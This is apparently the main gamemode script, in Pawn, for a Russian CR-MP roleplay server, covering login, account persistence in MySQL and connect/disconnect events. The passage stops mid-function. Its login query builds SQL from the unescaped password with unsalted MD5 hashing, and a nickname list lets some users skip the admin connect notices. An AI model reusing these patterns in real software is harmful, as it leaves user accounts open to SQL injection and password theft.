#include "../source/fractions/pps/m.inc"
#include "../source/fractions/pps/takelic.inc"
#include "../source/fractions/pps/open.inc"
// HEAL
#include "../source/fractions/heal/hospital.inc"
#include "../source/fractions/heal/heal.inc"

//ADM
#include "../source/fractions/adm/adm.inc"
#include "../source/fractions/adm/free.inc"
#include "../source/fractions/adm/guninvite.inc"
#include "../source/fractions/adm/selllic.inc"

//VDV
#include "../source/fractions/vdv/vdv.inc"
#include "../source/fractions/vdv/openvdv.inc"
#include "../source/fractions/vdv/getmet.inc"
#include "../source/fractions/vdv/putmet.inc"

//SMI
#include "../source/fractions/smi/smi.inc"
#include "../source/fractions/smi/edit.inc"
#include "../source/fractions/smi/news.inc"

//OPG
#include "../source/fractions/opg_o/opg.inc"
#include "../source/fractions/opg_o/makegun.inc"
#include "../source/fractions/opg_o/sellgun.inc"
#include "../source/fractions/opg_o/selldrugs.inc"
#include "../source/fractions/opg_o/tie.inc"
#include "../source/fractions/opg_o/untie.inc"
#include "../source/fractions/opg_o/close.inc"
#include "../source/fractions/opg_o/drugs.inc"

//#include    <nex-ac>
public OnGameModeInit()
{
	SetGameModeText(""gamemode"");
	SendRconCommand("hostname "hostname"");
	SendRconCommand("mapname "mapname"");
	SendRconCommand("language Russia");
	CreateMySQLConnection(sqlhost, sqluser, sqldb, sqlpass);

	DisableInteriorEnterExits();
	EnableStuntBonusForAll(0);
	LimitPlayerMarkerRadius(45.0);
	ManualVehicleEngineAndLights();
	
    new hours;
	gettime(hours);
	SetWorldTime(hours);

	SetTimer("secondupdate", 1000, true);
	SetTimer("minuteupdate", 55000, true);
	

	mysql_tquery(connects, "SELECT * FROM `other`", "LoadOther", "");
	mysql_tquery(connects, "SELECT * FROM `anticheats`", "LoadAntiCheats", "");
	mysql_tquery(connects, "SELECT * FROM `repositories`", "LoadRepositories", "");
	mysql_tquery(connects, "SELECT * FROM `bussines`", "LoadBusiness", "");
	mysql_tquery(connects, "SELECT * FROM `houses`", "LoadHouses", "");
	mysql_tquery(connects, "SELECT * FROM `podezd`", "LoadPodezd", "");
	mysql_tquery(connects, "SELECT * FROM `kvart`", "LoadKvart", "");
	mysql_tquery(connects, "SELECT * FROM `radars`", "LoadRadar", "");
	mysql_tquery(connects, "SELECT * FROM `atms`", "LoadAtm", "");
	mysql_tquery(connects, "SELECT * FROM `toilets`", "LoadToilets", "");
	mysql_tquery(connects, "SELECT * FROM `familys`", "LoadFamilys", "");
	

    #include "../source/server/load.inc"
	#include <../include/map/interiors.inc>
	#include <../include/map/map.inc>
    #include <../include/map/createobject.inc>

	return 1;
}

public OnGameModeExit()
{
	printf("[ONGAMEMODEEXIT]: Выгружаюсь!");
	foreach(new i : Player)
	{
	    SCMTA(red, "Внимание! Сервер выключен!");
	    NewKick(i);
	}
	mysql_close(connects);
	return 1;
}

public OnPlayerRequestClass(playerid, classid)
{
	if(PlayerInfo[playerid][pLogin] == true)
	{
		SetSpawnInfo(playerid, 0, 0, 0.0, 0.0, 0.0, 0.0, 0, 0, 0, 0, 0, 0);
		SpawnPlayer(playerid);
		return 1;
	}
	TogglePlayerControllable(playerid,0);
	return 1;
}


stock OnPlayerLogin(playerid, password[])
{
    new mysqlstr[144];
	mysql_format(connects,mysqlstr, sizeof(mysqlstr),"SELECT * FROM `accounts` WHERE `pName` = '%s' AND `pKey` = MD5('%s')", PlayerInfo[playerid][pName], password);
	mysql_function_query(connects, mysqlstr, true, "LoginCallback","ds", playerid, password);
	return true;
}
publics LoginCallback(playerid, password[])
{
    new rows[2];
	cache_get_data(rows[0], rows[1]);
	if(!rows[0])
	{
	    if(GetPVarInt(playerid, "wrongPass") == 2) return SCM(playerid,grey,"Вы ввели 3 раза неверный пароль, поэтому были кикнуты сервером."), NewKick(playerid);
		SetPVarInt(playerid, "wrongPass", GetPVarInt(playerid, "wrongPass")+1);
	    format(stringer, 170, "{"cwhite"}Добро пожаловать на {"cblue"}"name_serv"{"cwhite"}\n\nИмя персонажа {"cblue"}%s{"cwhite"}\nВведите пароль:\n\nОсталось попыток: {"cred"}%d", PlayerInfo[playerid][pName], 3 - GetPVarInt(playerid, "wrongPass"));
	    SPD(playerid, 7, DIALOG_STYLE_PASSWORD, "{"cblue"}Авторизация", stringer, "Войти", "Выйти");
	    return true;
	}
 	cache_get_field_content(0, "pKey", PlayerInfo[playerid][pKey], connects, 64);
 	cache_get_field_content(0, "pLastConnect", PlayerInfo[playerid][pLastConnect], connects, 64);

	PlayerInfo[playerid][pLastX] = cache_get_field_content_float(0, "pLastX");
	PlayerInfo[playerid][pLastY] = cache_get_field_content_float(0, "pLastY");
	PlayerInfo[playerid][pLastZ] = cache_get_field_content_float(0, "pLastZ");

	PlayerInfo[playerid][pPinCode] = cache_get_field_content_int(0, "pPinCode");

    PlayerInfo[playerid][pLVL] = cache_get_field_content_int(0, "pLVL");
    PlayerInfo[playerid][pBizID] = cache_get_field_content_int(0, "pBizID"); 
    PlayerInfo[playerid][pCarID] = cache_get_field_content_int(0, "pCarID");
    PlayerInfo[playerid][pHomeID] = cache_get_field_content_int(0, "pHomeID");
    PlayerInfo[playerid][pPodID] = cache_get_field_content_int(0, "pPodID");
    PlayerInfo[playerid][pKvartID] = cache_get_field_content_int(0, "pKvartID");
    PlayerInfo[playerid][pExp] = cache_get_field_content_int(0, "pExp");
    PlayerInfo[playerid][pID] = cache_get_field_content_int(0, "pID");
    PlayerInfo[playerid][pSex] = cache_get_field_content_int(0, "pSex");
    PlayerInfo[playerid][pChar] = cache_get_field_content_int(0, "pChar");
    PlayerInfo[playerid][pCash] = cache_get_field_content_int(0, "pCash");
    PlayerInfo[playerid][pBCash] = cache_get_field_content_int(0, "pBCash");
    PlayerInfo[playerid][pJail] = cache_get_field_content_int(0, "pJail");
    PlayerInfo[playerid][pMute] = cache_get_field_content_int(0, "pMute");
    PlayerInfo[playerid][pWarn] = cache_get_field_content_int(0, "pWarn");
    PlayerInfo[playerid][pJob] = cache_get_field_content_int(0, "pJob");
    PlayerInfo[playerid][pZakon] = cache_get_field_content_int(0, "pZakon");
    PlayerInfo[playerid][pFSkin] = cache_get_field_content_int(0, "pFSkin");
    PlayerInfo[playerid][pLogo] = cache_get_field_content_int(0, "pLogo");
    PlayerInfo[playerid][pTipster] = cache_get_field_content_int(0, "pTipster");
    PlayerInfo[playerid][pJobTipster] = cache_get_field_content_int(0, "pJobTipster");
    PlayerInfo[playerid][pPhoneNumber] = cache_get_field_content_int(0, "pPhoneNumber");
    PlayerInfo[playerid][pPhone] = cache_get_field_content_int(0, "pPhone");
    PlayerInfo[playerid][pPhoneCash] = cache_get_field_content_int(0, "pPhoneCash");
    PlayerInfo[playerid][pKPZ] = cache_get_field_content_int(0, "pKPZ");
    PlayerInfo[playerid][pWANTED] = cache_get_field_content_int(0, "pWANTED");
    PlayerInfo[playerid][pJP] = cache_get_field_content_int(0, "pJP");
    PlayerInfo[playerid][pHOSPITAL] = cache_get_field_content_int(0, "pHOSPITAL");
    
    PlayerInfo[playerid][pFamID] = cache_get_field_content_int(0, "pFamID");
    PlayerInfo[playerid][pFamRang] = cache_get_field_content_int(0, "pFamRang");
	cache_get_field_content(0, "pDateReg", PlayerInfo[playerid][pDateReg], connects, 20);

    PlayerInfo[playerid][pHP] = cache_get_field_content_float(0, "pHP");
    PlayerInfo[playerid][pARM] = cache_get_field_content_float(0, "pARM");
    PlayerInfo[playerid][pTruckLVL] = cache_get_field_content_int(0, "pTruckLVL");
    PlayerInfo[playerid][pTruckEXP] = cache_get_field_content_int(0, "pTruckEXP");
    
    PlayerInfo[playerid][pMetall] = cache_get_field_content_int(0, "pMetall");
    PlayerInfo[playerid][pPatr] = cache_get_field_content_int(0, "pPatr");
    PlayerInfo[playerid][pDrugs] = cache_get_field_content_int(0, "pDrugs");
    PlayerInfo[playerid][pLomka] = cache_get_field_content_int(0, "pLomka");

    PlayerInfo[playerid][pLicA] = cache_get_field_content_int(0, "pLicA");
    PlayerInfo[playerid][pLicB] = cache_get_field_content_int(0, "pLicB");
    PlayerInfo[playerid][pLicC] = cache_get_field_content_int(0, "pLicC");
    PlayerInfo[playerid][pLicD] = cache_get_field_content_int(0, "pLicD");
    PlayerInfo[playerid][pLicBiz] = cache_get_field_content_int(0, "pLicBiz");
    PlayerInfo[playerid][pLicGun] = cache_get_field_content_int(0, "pLicGun");
    PlayerInfo[playerid][pLicFly] = cache_get_field_content_int(0, "pLicFly");
    
    PlayerInfo[playerid][pVoen] = cache_get_field_content_int(0, "pVoen");
    PlayerInfo[playerid][pVoenEXP] = cache_get_field_content_int(0, "pVoenEXP");

    cache_get_field_content(0, "pJailOffMess", PlayerInfo[playerid][pJailOffMess], connects, 144);
    cache_get_field_content(0, "pMuteOffMess", PlayerInfo[playerid][pMuteOffMess], connects, 144);
    cache_get_field_content(0, "pOffUninviteMess", PlayerInfo[playerid][pOffUninviteMess], connects, 144);
    cache_get_field_content(0, "pHouseOffMess", PlayerInfo[playerid][pHouseOffMess], connects, 144);
    cache_get_field_content(0, "pBizOffMess", PlayerInfo[playerid][pBizOffMess], connects, 144);
    cache_get_field_content(0, "pKvartOffMess", PlayerInfo[playerid][pKvartOffMess], connects, 144);
    cache_get_field_content(0, "pFAMoffuninvite", PlayerInfo[playerid][pFAMoffuninvite], connects, 144);

    cache_get_field_content(0, "pRegIP", PlayerInfo[playerid][pRegIP], connects, 16);
    cache_get_field_content(0, "pLastIP", PlayerInfo[playerid][pLastIP], connects, 16);
	// Лидерские права
	PlayerInfo[playerid][pMember] = cache_get_field_content_int(0, "pMember");
	PlayerInfo[playerid][pRang] = cache_get_field_content_int(0, "pRang");
	PlayerInfo[playerid][pModel] = cache_get_field_content_int(0, "pModel");
	PlayerInfo[playerid][pWarnF] = cache_get_field_content_int(0, "pWarnF");
	PlayerInfo[playerid][pVIP] = cache_get_field_content_int(0, "pVIP");
	// Административные и Саппортские права
	PlayerInfo[playerid][pWarnA] = cache_get_field_content_int(0, "pWarnA");
	PlayerInfo[playerid][bAdmin] = cache_get_field_content_int(0, "bAdmin");
	PlayerInfo[playerid][bYoutube] = cache_get_field_content_int(0, "bYoutube");
 	PlayerInfo[playerid][bJail] = cache_get_field_content_int(0, "bJail");
    PlayerInfo[playerid][bMute] = cache_get_field_content_int(0, "bMute");
 	PlayerInfo[playerid][bOffJail] = cache_get_field_content_int(0, "bOffJail");
    PlayerInfo[playerid][bOffMute] = cache_get_field_content_int(0, "bOffMute");
    PlayerInfo[playerid][bOffWarn] = cache_get_field_content_int(0, "bOffWarn");
    PlayerInfo[playerid][bOffBan] = cache_get_field_content_int(0, "bOffBan");
   	SpID[playerid] = -1;
	SpType[playerid] = SP_TYPE_NONE;
	
	PlayerInfo[playerid][R_9MM] = cache_get_field_content_int(0, "R_9MM");
	PlayerInfo[playerid][R_USP] = cache_get_field_content_int(0, "R_USP");
	PlayerInfo[playerid][R_DEAGLE] = cache_get_field_content_int(0, "R_DEAGLE");
	PlayerInfo[playerid][R_TEK9] = cache_get_field_content_int(0, "R_TEK9");
	PlayerInfo[playerid][R_USI] = cache_get_field_content_int(0, "R_USI");
	PlayerInfo[playerid][R_MP5] = cache_get_field_content_int(0, "R_MP5");
	PlayerInfo[playerid][R_SHOTGUN] = cache_get_field_content_int(0, "R_SHOTGUN");
	PlayerInfo[playerid][R_SAWED_OF] = cache_get_field_content_int(0, "R_SAWED_OF");
	PlayerInfo[playerid][R_FIGHT_SHOTGUN] = cache_get_field_content_int(0, "R_FIGHT_SHOTGUN");
	PlayerInfo[playerid][R_AK47] = cache_get_field_content_int(0, "R_AK47");
	PlayerInfo[playerid][R_M4] = cache_get_field_content_int(0, "R_M4");
	PlayerInfo[playerid][R_COUNTRY_RIFLE] = cache_get_field_content_int(0, "R_COUNTRY_RIFLE");
	PlayerInfo[playerid][R_SNIPER_RIFLE] = cache_get_field_content_int(0, "R_SNIPER_RIFLE");
	PlayerInfo[playerid][R_SMOKE] = cache_get_field_content_int(0, "R_SMOKE");
	PlayerInfo[playerid][R_GRENADE] = cache_get_field_content_int(0, "R_GRENADE");
	PlayerInfo[playerid][R_MOLOTOV] = cache_get_field_content_int(0, "R_MOLOTOV");
	
	PlayerInfo[playerid][pMask] = cache_get_field_content_int(0, "pMask");
	PlayerInfo[playerid][pHeal] = cache_get_field_content_int(0, "pHeal");
	PlayerInfo[playerid][pPepsi] = cache_get_field_content_int(0, "pPepsi");
	PlayerInfo[playerid][pBackPack] = cache_get_field_content_int(0, "pBackPack");
	PlayerInfo[playerid][pSmoke] = cache_get_field_content_int(0, "pSmoke");
	PlayerInfo[playerid][pBeer] = cache_get_field_content_int(0, "pBeer");
	PlayerInfo[playerid][pLighter] = cache_get_field_content_int(0, "pLighter");
	PlayerInfo[playerid][pChips] = cache_get_field_content_int(0, "pChips");
	new l_cb_needs[32];
    cache_get_field_content(0, "pNeeds", l_cb_needs, connects, sizeof(l_cb_needs));
    sscanf(l_cb_needs, "p<,>dddd", PlayerInfo[playerid][pNeedToilet], PlayerInfo[playerid][pNeedEat], PlayerInfo[playerid][pNeedDrink], PlayerInfo[playerid][pNeedWash]);
    
	
	new l_guns[56], l_ammo[56];
	cache_get_field_content(0, "pGun", l_guns, connects, 16);
	cache_get_field_content(0, "pAmmo", l_ammo, connects, 16);
	
	new g_data[13], a_data[13];
	sscanf(l_guns, "p<,>a<i>[13]", g_data);
	sscanf(l_ammo, "p<,>a<i>[13]", a_data);
	for(new i; i < 13; i++)
	{
	    PlayerInfo[playerid][pGun][i] = g_data[i];
	    PlayerInfo[playerid][pAmmo][i] = a_data[i];
	}
	
	if(PlayerInfo[playerid][pLogo] == 0)
	{
	    for(new i = 0; i < 3; i++) TextDrawShowForPlayer(playerid, logotype_td[i]);
	}
	else TextDrawShowForPlayer(playerid, logotype_td[3]);
	
	new string[256];
	if(strcmp(PlayerInfo[playerid][pOffUninviteMess], "None", true))
	{
	    format(string, sizeof(string), "%s", PlayerInfo[playerid][pOffUninviteMess]);
	    SCM(playerid, red, string);
	    SaveAccounts(playerid);
	}
	if(strcmp(PlayerInfo[playerid][pHouseOffMess], "None", true))
	{
	    SCM(playerid, green, PlayerInfo[playerid][pHouseOffMess]);
	    SaveAccounts(playerid);
	}
	if(strcmp(PlayerInfo[playerid][pBizOffMess], "None", true))
	{
	    SCM(playerid, green, PlayerInfo[playerid][pBizOffMess]);
	    SaveAccounts(playerid);
	}
	if(strcmp(PlayerInfo[playerid][pKvartOffMess], "None", true))
	{
	    SCM(playerid, green, PlayerInfo[playerid][pKvartOffMess]);
	    SaveAccounts(playerid);
	}
	if(strcmp(PlayerInfo[playerid][pFAMoffuninvite], "None", true))
	{
	    SCM(playerid, green, PlayerInfo[playerid][pFAMoffuninvite]);
	    SaveAccounts(playerid);
	}
	
	
	
 	new querybans[256];
    format(querybans, sizeof(querybans), "SELECT * FROM `Bans` WHERE `Nick` = '%s'", PlayerInfo[playerid][pName]);
	mysql_function_query(connects, querybans, true, "CheckBan", "d", playerid);
	
	format(string, sizeof(string), "Вы успешно авторизовались! Номер вашего аккаунта: %d", PlayerInfo[playerid][pID]);
	SCM(playerid, need, string);
	
	if(PlayerInfo[playerid][bAdmin] > 0)
	{
	    format(string, sizeof(string), "Вы авторизовались как Администратор %d уровня.", PlayerInfo[playerid][bAdmin]);
	    SCM(playerid, need, string);
	}
	if(PlayerInfo[playerid][pWarn] > 0)
	{
	    format(querybans, sizeof(querybans), "SELECT * FROM `unwarn` WHERE `Nick` = '%s'", PlayerInfo[playerid][pName]);
        mysql_function_query(connects, querybans, true, "CheckWarn", "d", playerid);
	}
	if(PlayerInfo[playerid][bAdmin] > 0 && PlayerInfo[playerid][bAdmin] < 7)
	{
		static const fmt_msg[] = "[A] %s %s[%d] авторизовался. [IP: %s | R-IP: %s]";
		format(string, sizeof(string), fmt_msg, GetRangAdmin[PlayerInfo[playerid][bAdmin]], PlayerInfo[playerid][pName], playerid, PlayerInfo[playerid][pNewIp], PlayerInfo[playerid][pRegIP]);
		SCMA(0x87bae7FF, string);
	}
	
	if(PlayerInfo[playerid][pHomeID] != -1)
	{
		new query[60];
		format(query, sizeof(query), "SELECT * FROM `ownable_cars` WHERE `owner_id` = '%d'", PlayerInfo[playerid][pID]);
		mysql_tquery(connects, query, "LoadMyCar", "i", playerid);
	}
    return 1;
}
stock SaveAccounts(playerid)
{
	new sql_str[528];
	
 	format(sql_str, sizeof(sql_str), "UPDATE `accounts` SET `pBizID` = '%d', `pCarID` = '%d', `pHomeID` = '%d', `pPodID` = '%d', `pKvartID` = '%d' WHERE `pName` = '%s' LIMIT 1",PlayerInfo[playerid][pBizID],PlayerInfo[playerid][pCarID], PlayerInfo[playerid][pHomeID], PlayerInfo[playerid][pPodID], PlayerInfo[playerid][pKvartID],PlayerInfo[playerid][pName]);
 	mysql_tquery(connects, sql_str, "", "");
 	
 	new all_sql_str[4000];
	format
	(
		all_sql_str, sizeof(all_sql_str),
		
		"UPDATE `accounts` SET `pName` = '%s',\
	 	`pLastConnect` = '%s',\
	 	`pLastIP` = '%s',\
	 	`pSex` = '%d',\
	 	`pPhoneNumber` = '%d',\
	 	`pPhone` = '%d',\
	 	`pPhoneCash` = '%d',\
	 	`pCash` = '%d',\
	 	`pBCash` = '%d',\
	 	`pTruckLVL` = '%d',\
	 	`pTruckEXP` = '%d',\
	 	`pEmail` = '%s',\
	 	`pLVL` = '%d',\
	 	`pMember` = '%d',\
	 	`pModel` = '%d',\
	 	`pChar` = '%d',\
	 	`pRang` = '%d',\
	 	`pWarnF` = '%d',\
		`pWarnA` = '%d',\
		`bAdmin` = '%d',\
		`pJob` = '%d',\
		`pVIP` = '%d',\
		`pExp` = '%d',\
		`pMute` = '%d',\
		`pHP` = '%f',\
		`pARM` = '%f',\
		`pJail` = '%d',\
		`bJail` = '%d',\
		`bBan` = '%d',\
		`bWarn` = '%d',\
		`bYoutube` = '%d',\
		`pZakon` = '%d',\
		`bMute` = '%d',\
		`bOffMute` = '%d',\
		`bOffJail` = '%d',\
		`bOffBan` = '%d',\
		`bOffWarn` = '%d',\
		`bUnWarn` = '%d',\
		`bUnBan` = '%d',\
		`pWarn` = '%d',\
		`pFSkin` = '%d',\
		`pLastX` = '%f',\
		`pLastY` = '%f',\
		`pLastZ` = '%f',\
		`pJailOffMess` = 'None',\
		`pMuteOffMess` = 'None',\
		`pHouseOffMess` = 'None',\
        `pBizOffMess` = 'None',\
        `pKvartOffMess` = 'None',\
        `pFAMoffuninvite` = 'None',\
		`pLicA` = '%d',\
		`pLicB` = '%d',\
		`pLicC` = '%d',\
		`pLicD` = '%d',\
		`pLicBiz` = '%d',\
		`pLicGun` = '%d',\
		`pLicFly` = '%d',\
		`pVoen` = '%d',\
		`pVoenEXP` = '%d',\
		`pOffUninviteMess` = 'None',\
		`pLogo` = '%d',\
		`pTipster` = '%d',\
		`pJobTipster` = '%d',\
		`pKPZ` = '%d',\
		`pJP` = '%d',\
		`pWANTED` = '%d',\
		`pHOSPITAL` = '%d',\
		`pMask` = '%d',\
		`pHeal` = '%d',\
		`pPepsi` = '%d',\
		`pBackPack` = '%d',\
		`pSmoke` = '%d',\
		`pBeer` = '%d',\
		`pLighter` = '%d',\
		`pChips` = '%d',\
		`pMetall` = '%d',\
		`pPatr` = '%d',\
		`pDrugs` = '%d',\
		`pLomka` = '%d',\
		`R_9MM` = '%d',\
		`R_USP` = '%d',\
		`R_DEAGLE` = '%d',\
		`R_TEK9` = '%d',\
		`R_USI` = '%d',\
		`R_MP5` = '%d',\
		`R_SHOTGUN` = '%d',\
		`R_SAWED_OF` = '%d',\
		`R_FIGHT_SHOTGUN` = '%d',\
		`R_AK47` = '%d',\
		`R_M4` = '%d',\
		`R_COUNTRY_RIFLE` = '%d',\
		`R_SNIPER_RIFLE` = '%d',\
		`R_SMOKE` = '%d',\
		`R_GRENADE` = '%d',\
		`R_MOLOTOV` = '%d',\
		`pFines` = '%d',\
		`pSumFines` = '%d',\
		`pFamID` = '%d',\
		`pFamRang` = '%d' WHERE `pName` = '%s'",
		PlayerInfo[playerid][pName],
		PlayerInfo[playerid][pLastConnect],
		PlayerInfo[playerid][pLastIP],
		PlayerInfo[playerid][pSex],
		PlayerInfo[playerid][pPhoneNumber],
		PlayerInfo[playerid][pPhone],
		PlayerInfo[playerid][pPhoneCash],
		PlayerInfo[playerid][pCash],
		PlayerInfo[playerid][pBCash],
		PlayerInfo[playerid][pTruckLVL],
		PlayerInfo[playerid][pTruckEXP],
		PlayerInfo[playerid][pEmail],
		PlayerInfo[playerid][pLVL],
		PlayerInfo[playerid][pMember],
		PlayerInfo[playerid][pModel],
		PlayerInfo[playerid][pChar],
		PlayerInfo[playerid][pRang],
		PlayerInfo[playerid][pWarnF],
		PlayerInfo[playerid][pWarnA],
		PlayerInfo[playerid][bAdmin],
		PlayerInfo[playerid][pJob],
		PlayerInfo[playerid][pVIP],
		PlayerInfo[playerid][pExp],
		PlayerInfo[playerid][pMute],
		PlayerInfo[playerid][pHP],
		PlayerInfo[playerid][pARM],
		PlayerInfo[playerid][pJail],
		PlayerInfo[playerid][bJail],
		PlayerInfo[playerid][bBan],
		PlayerInfo[playerid][bWarn],
		PlayerInfo[playerid][bYoutube],
		PlayerInfo[playerid][pZakon],
		PlayerInfo[playerid][bMute],
		PlayerInfo[playerid][bOffMute],
		PlayerInfo[playerid][bOffJail],
		PlayerInfo[playerid][bOffBan],
		PlayerInfo[playerid][bOffWarn],
		PlayerInfo[playerid][bUnWarn],
		PlayerInfo[playerid][bUnBan],
		PlayerInfo[playerid][pWarn],
		PlayerInfo[playerid][pFSkin],
		PlayerInfo[playerid][pLastX],
		PlayerInfo[playerid][pLastY],
		PlayerInfo[playerid][pLastZ],
		PlayerInfo[playerid][pLicA],
		PlayerInfo[playerid][pLicB],
		PlayerInfo[playerid][pLicC],
		PlayerInfo[playerid][pLicD],
		PlayerInfo[playerid][pLicBiz],
		PlayerInfo[playerid][pLicGun],
		PlayerInfo[playerid][pLicFly],
		PlayerInfo[playerid][pVoen],
		PlayerInfo[playerid][pVoenEXP],
		PlayerInfo[playerid][pLogo],
		PlayerInfo[playerid][pTipster],
		PlayerInfo[playerid][pJobTipster],
		PlayerInfo[playerid][pKPZ],
		PlayerInfo[playerid][pJP],
		PlayerInfo[playerid][pWANTED],
		PlayerInfo[playerid][pHOSPITAL],
  		PlayerInfo[playerid][pMask],
  		PlayerInfo[playerid][pHeal],
  		PlayerInfo[playerid][pPepsi],
  		PlayerInfo[playerid][pBackPack],
  		PlayerInfo[playerid][pSmoke],
  		PlayerInfo[playerid][pBeer],
  		PlayerInfo[playerid][pLighter],
  		PlayerInfo[playerid][pChips],
		PlayerInfo[playerid][pMetall],
		PlayerInfo[playerid][pPatr],
		PlayerInfo[playerid][pDrugs],
		PlayerInfo[playerid][pLomka],
		PlayerInfo[playerid][R_9MM],
		PlayerInfo[playerid][R_USP],
		PlayerInfo[playerid][R_DEAGLE],
		PlayerInfo[playerid][R_TEK9],
		PlayerInfo[playerid][R_USI],
		PlayerInfo[playerid][R_MP5],
		PlayerInfo[playerid][R_SHOTGUN],
		PlayerInfo[playerid][R_SAWED_OF],
		PlayerInfo[playerid][R_FIGHT_SHOTGUN],
		PlayerInfo[playerid][R_AK47],
		PlayerInfo[playerid][R_M4],
		PlayerInfo[playerid][R_COUNTRY_RIFLE],
		PlayerInfo[playerid][R_SNIPER_RIFLE],
		PlayerInfo[playerid][R_SMOKE],
		PlayerInfo[playerid][R_GRENADE],
		PlayerInfo[playerid][R_MOLOTOV],
		PlayerInfo[playerid][pFines],
		PlayerInfo[playerid][pSumFines],
	  	PlayerInfo[playerid][pFamID],
	 	PlayerInfo[playerid][pFamRang],
	 	PlayerInfo[playerid][pName]
	);
 	mysql_tquery(connects, all_sql_str, "", "");
 	
    new cb_needs[30];
	format(cb_needs, sizeof(cb_needs), "%d,%d,%d,%d", PlayerInfo[playerid][pNeedToilet], PlayerInfo[playerid][pNeedEat], PlayerInfo[playerid][pNeedDrink], PlayerInfo[playerid][pNeedWash]);
	format(sql_str, sizeof(sql_str), "UPDATE `accounts` SET `pNeeds` = '%s' WHERE `pName` = '%s'", cb_needs, PlayerInfo[playerid][pName]);
	mysql_tquery(connects, sql_str, "", "");
 	
	for(new i = 0; i != 13; i++) GetPlayerWeaponData(playerid, i, PlayerInfo[playerid][pGun][i], PlayerInfo[playerid][pAmmo][i]);
	new gun_string[56], ammo_string[56];
	format(gun_string, 56, "%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d",
	PlayerInfo[playerid][pGun][0], PlayerInfo[playerid][pGun][1], PlayerInfo[playerid][pGun][2], PlayerInfo[playerid][pGun][3],
	PlayerInfo[playerid][pGun][4], PlayerInfo[playerid][pGun][5], PlayerInfo[playerid][pGun][6], PlayerInfo[playerid][pGun][7],
	PlayerInfo[playerid][pGun][8], PlayerInfo[playerid][pGun][9], PlayerInfo[playerid][pGun][10], PlayerInfo[playerid][pGun][11],
	PlayerInfo[playerid][pGun][12]);

	format(ammo_string, 56, "%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d",
	PlayerInfo[playerid][pAmmo][0], PlayerInfo[playerid][pAmmo][1], PlayerInfo[playerid][pAmmo][2], PlayerInfo[playerid][pAmmo][3],
	PlayerInfo[playerid][pAmmo][4], PlayerInfo[playerid][pAmmo][5], PlayerInfo[playerid][pAmmo][6], PlayerInfo[playerid][pAmmo][7],
	PlayerInfo[playerid][pAmmo][8], PlayerInfo[playerid][pAmmo][9], PlayerInfo[playerid][pAmmo][10], PlayerInfo[playerid][pAmmo][11],
	PlayerInfo[playerid][pAmmo][12]);

 	format(sql_str, sizeof(sql_str), "UPDATE `accounts` SET `pGun` = '%s', `pAmmo` = '%s' WHERE `pName` = '%s'", gun_string, ammo_string, PlayerInfo[playerid][pName]);
 	mysql_tquery(connects, sql_str, "", "");
 	return 1;
}

public OnPlayerConnect(playerid)
{
    ClearAccount(playerid);
	ClearProposition(playerid);
	for(new i = 0; i < 100; i++)
	{
	    SCM(playerid, white, "");
	}
	SCM(playerid, need, "UNIGVA GAMES:");
	SCM(playerid, need, "Стартовал {FFFFFF}Criminal Russia Multiplayer {"cred"}Ревизия G {"cgrey"}(CR-MP 0.3.7)");
	SCM(playerid, need, "Подключение к серверу Unigva Roleplay...");
	SCM(playerid, need, "Подключение установлено. Вход в игру...");

	SetPlayerColor(playerid,0xFFFFFFFF);
	ResetPlayer(playerid);
	#include <../include/map/remove_object.inc>
	GetPlayerName(playerid, PlayerInfo[playerid][pName], MAX_PLAYER_NAME);
	PlayerInfo[playerid][pLogin] = false;
	ResetPlayerWeaponsAC(playerid);
	
	if(!IsRPNick(PlayerInfo[playerid][pName]))
	{
	    SPD(playerid, D_NULL, DIALOG_STYLE_MSGBOX, "{"cblue"}UNIGVA | NonRP Nick", "{FFFFFF}Ваш ник-нейм, не соотвествует правилам нашего сервера!\nСмените его и перезайдите в игру.\n\nНик должен состоять из Имени и Фамилии и только английских букв, а так же иметь нижнее подчеркивание '_'.\nПримеры: Sam_Esmail, Tatiana_Pilipiuk", "Закрыть", "");
	    NewKick(playerid);
	}

	if(server_pass_status == 1) ShowServerPassDialog(playerid);
	else
	{
        new string[128];
		format(string, sizeof(string),"SELECT * FROM `accounts` WHERE `pName` = '%s'", PlayerInfo[playerid][pName]);
		mysql_function_query(connects, string, true, "OnPlayerRegCheck", "d", playerid);
	}

    new string[256];
    new ip[20];
    GetPlayerIp(playerid, ip, sizeof(ip));
	strmid(PlayerInfo[playerid][pNewIp], ip, 0, 16);
	ClearCallingsForPlayer(playerid);
	
	LoadPlayerTextDraws(playerid);
	ClearAnimations(playerid);
	player_second_timer[playerid] = SetTimerEx("PlayerSecondTimer", 1000, true, "i", playerid);

	
	for(new i = 0; i < sizeof(SuperNick_S); i++) if(!strcmp(PlayerInfo[playerid][pName], SuperNick_S[i], true)) return 1;

	format(string, sizeof(string), "[A] Игрок %s[%d] зашел на сервер (IP: %s)", PlayerInfo[playerid][pName], playerid, ip);
	SCMA(grey, string);

	return 1;
}


public OnPlayerDisconnect(playerid, reason)
{
	new Float:x, Float:y, Float:z;
	GetPlayerPos(playerid, x, y, z);
	GetPlayerHealth(playerid, PlayerInfo[playerid][pHP]);
	GetPlayerArmour(playerid, PlayerInfo[playerid][pARM]);
    KillTimers(playerid);

    PlayerInfo[playerid][pLastX] = x;
    PlayerInfo[playerid][pLastY] = y;
    PlayerInfo[playerid][pLastZ] = z;
    
	ClearProposition(playerid);
	
    new string[256];
    switch(reason)
    {
        case 0: format(string, sizeof(string), "[A] Игрок %s[%d] вылетел из игры. (IP: %s)", PlayerInfo[playerid][pName], playerid, PlayerInfo[playerid][pNewIp]);
        case 1: format(string, sizeof(string), "[A] Игрок %s[%d] покинул игру. (IP: %s)", PlayerInfo[playerid][pName], playerid, PlayerInfo[playerid][pNewIp]);
        case 2: format(string, sizeof(string), "[A] Игрок %s[%d] был кикнут с сервера. (IP: %s)", PlayerInfo[playerid][pName], playerid, PlayerInfo[playerid][pNewIp]);
    }
    if(PlayerInfo[playerid][bAdmin] < 6) SCMA(grey, string);

	new hour, minute, second, year, month, day, data[64];
	gettime(hour, minute, second);
	getdate(year, month, day);
	format(data, sizeof(data), "%0d.%02d.%d -- %d:%02d:%02d", day, month, year, hour, minute, second);
	strdel(PlayerInfo[playerid][pLastConnect], 0, 50);
	strmid(PlayerInfo[playerid][pLastConnect], data, 0, 50);

	strdel(PlayerInfo[playerid][pLastIP], 0, 16);
	strmid(PlayerInfo[playerid][pLastIP], PlayerInfo[playerid][pNewIp], 0, 16);
